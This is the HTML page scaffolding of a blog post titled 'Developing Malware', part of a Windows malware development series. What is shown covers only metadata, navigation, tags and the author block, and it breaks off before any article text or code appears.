<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="false"><head>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Developing Malware &middot; Gr1dSec</title>
  <meta name="title" content="Developing Malware &middot; Gr1dSec" />
  
  <meta name="description" content="Second part in the &#39;Windows Malware Development&#39; series" />
  <meta name="keywords" content="Malware, Microsoft, Development, " />
  
  
  <link rel="canonical" href="https://gridsec.net/posts/windows-malware-development/developing-malware/" />
  
  
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.c65781782bcb9274500ab9bd5d7beaeaf0a100bc57e19b04ea7ba49ecf1d6f89c2e4351797f5acb201595a2539a643a36d3a2249b68ded3ed959978c5a15b47a.css"
    integrity="sha512-xleBeCvLknRQCrm9XXvq6vChALxX4ZsE6nukns8db4nC5DUXl/WssgFZWiU5pkOjbToiSbaN7T7ZWZeMWhW0eg==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.63eb961df429101726f4a2d4b562fc350d3b55f54c8a592b99d527db7aa43b3f71d0f22601aa024f801677621e0beae33564dffcb028f2be8fa7a64c3ce0d4c2.js"
    integrity="sha512-Y&#43;uWHfQpEBcm9KLUtWL8NQ07VfVMilkrmdUn23qkOz9x0PImAaoCT4AWd2IeC&#43;rjNWTf/LAo8r6Pp6ZMPODUwg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.41ae28f18e45390305fc47f5b1e752402de52ec8f5c856199ce7ca6d60d762bf93b8973df4a0ea1ff44137f1123151cc893e0236467116cd7bbbdd04c4f5bf2f.js"
    integrity="sha512-Qa4o8Y5FOQMF/Ef1sedSQC3lLsj1yFYZnOfKbWDXYr&#43;TuJc99KDqH/RBN/ESMVHMiT4CNkZxFs17u90ExPW/Lw==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.fcbc7f7b3dcea96e3b5570cd322c5d7a12d5351c87f9889b1c31745a2cc711df58f6b70795a86d50e63813b236ade916668332c10a70a4ce26f7c0878f525fce.js" integrity="sha512-/Lx/ez3OqW47VXDNMixdehLVNRyH&#43;YibHDF0WizHEd9Y9rcHlahtUOY4E7I2rekWZoMywQpwpM4m98CHj1Jfzg=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="https://gridsec.net/posts/windows-malware-development/developing-malware/">
  <meta property="og:site_name" content="Gr1dSec">
  <meta property="og:title" content="Developing Malware">
  <meta property="og:description" content="Second part in the ‘Windows Malware Development’ series">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-05-04T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-05-04T00:00:00+00:00">
    <meta property="article:tag" content="Malware">
    <meta property="article:tag" content="Microsoft">
    <meta property="article:tag" content="Development">
    <meta property="og:image" content="https://gridsec.net/posts/windows-malware-development/developing-malware/featured.png">
      <meta property="og:see_also" content="https://gridsec.net/posts/windows-malware-development/debugging-and-mitigation/">
      <meta property="og:see_also" content="https://gridsec.net/posts/windows-malware-development/introduction/">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://gridsec.net/posts/windows-malware-development/developing-malware/featured.png">
  <meta name="twitter:title" content="Developing Malware">
  <meta name="twitter:description" content="Second part in the ‘Windows Malware Development’ series">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Developing Malware",
    "headline": "Developing Malware",
    
    "abstract": "Second part in the \u0026lsquo;Windows Malware Development\u0026rsquo; series",
    "inLanguage": "en",
    "url" : "https:\/\/gridsec.net\/posts\/windows-malware-development\/developing-malware\/",
    "author" : {
      "@type": "Person",
      "name": "Gr1dGh0st"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-05-04T00:00:00\u002b00:00",
    "datePublished": "2025-05-04T00:00:00\u002b00:00",
    
    "dateModified": "2025-05-04T00:00:00\u002b00:00",
    
    "keywords": ["Malware","Microsoft","Development"],
    
    "mainEntityOfPage": "true",
    "wordCount": "3654"
  }]
  </script>


  
  
  <meta name="author" content="Gr1dGh0st" />
  
  
  
  <link href="https://github.com/Gr1dGh0st" rel="me" />
  
  
  <link href="mailto:gr1dgh0st@gridsec.net" rel="me" />
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
    
    
    
    <div>
        <a href="/" class="flex">
            <span class="sr-only">Gr1dSec</span>

            
            <img src="/img/Logo_Smol.png" width="60" height="60"
                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Gr1dSec" />
            

        </a>
    </div>
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Gr1dSec</a>
            

        </nav>
        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">

            
            
            
  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Home
    </p>
</a>



            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Posts">
        Posts
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="About">
        About
    </p>
</a>



            
            
  <a href="https://github.com/Gr1dGh0st"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <span >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


    </span>
    
    <p class="text-base font-medium" title="">
        
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class=" flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Home
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Posts">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="About">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="https://github.com/Gr1dGh0st"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <div >
            

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


        </div>
        
        <p class="text-bg font-bg" title="">
            
        </p>
    </a>
</li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>




<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>


  </div>
</div>
<script>
  window.addEventListener('scroll', function (e) {
    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
    var background_blur = document.getElementById('menu-blur');
    background_blur.style.opacity = (scroll / 300);
  });
</script>

  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  
        
            <div class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/posts/windows-malware-development/developing-malware/featured_hu_5bc4e6f953859a6d.png);"></div>
        
    
  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      ></a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/windows-malware-development/"
      >Windows Malware Development</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/windows-malware-development/developing-malware/"
      >Developing Malware</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      Developing Malware
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  





  



  











  



<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2025-05-04T00:00:00&#43;00:00">4 May, 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3654 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&middot;</span>


<script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>

<span class="mb-[2px]">
    <span id="zen-mode-button"
          class="text-lg hover:text-primary-500"
          title="Enable zen mode"
          data-title-i18n-disable="Enable zen mode"
          data-title-i18n-enable="Disable zen mode">
        <span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
</svg>
  </span>

</span>
    </span>
</span>
  

  
  
</div>





<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/malware/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Malware
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/microsoft/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Microsoft
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/development/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Development
  </span>
</span>
  </span>
  
  
  
  
</div>




    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
      alt="Gr1dGh0st" src="/img/Avatar1_1_hu_5568d3cad0122477.png" />
    
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      Gr1dGh0st
    </div>
    
    
    <div class="text-sm text-neutral-700 dark:text-neutral-400">Cybersecurity professional specializing in offensive security and security research.</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/Gr1dGh0st"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="mailto:gr1dgh0st@gridsec.net"
